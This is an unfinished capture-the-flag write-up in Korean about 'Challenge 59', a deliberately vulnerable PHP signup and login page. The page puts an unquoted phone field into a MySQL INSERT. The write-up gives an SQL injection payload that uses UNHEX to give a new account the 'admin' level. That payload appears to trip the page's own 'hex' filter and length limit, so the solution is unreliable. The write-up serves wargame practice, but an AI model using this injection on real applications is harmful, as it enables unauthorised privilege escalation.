source
```php
<?php
  include "../../config.php";
  if($_GET['view_source']) view_source();
  $db = dbconnect();
  if($_POST['lid'] && isset($_POST['lphone'])){
    $_POST['lid'] = addslashes($_POST['lid']);
    $_POST['lphone'] = addslashes($_POST['lphone']);
    $result = mysqli_fetch_array(mysqli_query($db,"select id,lv from chall59 where id='{$_POST['lid']}' and phone='{$_POST['lphone']}'"));
    if($result['id']){
      echo "id : {$result['id']}<br>lv : {$result['lv']}<br><br>";
      if($result['lv'] == "admin"){
      mysqli_query($db,"delete from chall59");
      solve(59);
    }
    echo "<br><a href=./?view_source=1>view-source</a>";
    exit();
    }
  }
  if($_POST['id'] && isset($_POST['phone'])){
    $_POST['id'] = addslashes($_POST['id']);
    $_POST['phone'] = addslashes($_POST['phone']);
    if(strlen($_POST['phone'])>=20) exit("Access Denied");
    if(preg_match("/admin/i",$_POST['id'])) exit("Access Denied");
    if(preg_match("/admin|0x|#|hex|char|ascii|ord|select/i",$_POST['phone'])) exit("Access Denied");
    mysqli_query($db,"insert into chall59 values('{$_POST['id']}',{$_POST['phone']},'guest')");
  }
?>
<html><head><title>Challenge 59</title></head><body>
<form method=post>
<table border=1>
<tr><td></td><td>ID</td><td>PHONE</td><td></td></tr>
<tr><td>JOIN</td><td><input name=id></td><td><input name=phone></td><td><input type=submit></td></tr>
<tr><td>LOGIN</td><td><input name=lid></td><td><input name=lphone></td><td><input type=submit></td></tr>
</form>
<br>
<a href=./?view_source=1>view-source</a>
</body></html>
```

```sql
insert into chall59 values('frog' , '010', UNHEX('61646d696e')) -- ',{$_POST['phone']},'guest')");
```
* '을 쓸 수 없다.
* 우선 phone에 quote가 안걸려 있으니, 여길 노려야 한다. 숫자만 받으려고 했나 보다.
* 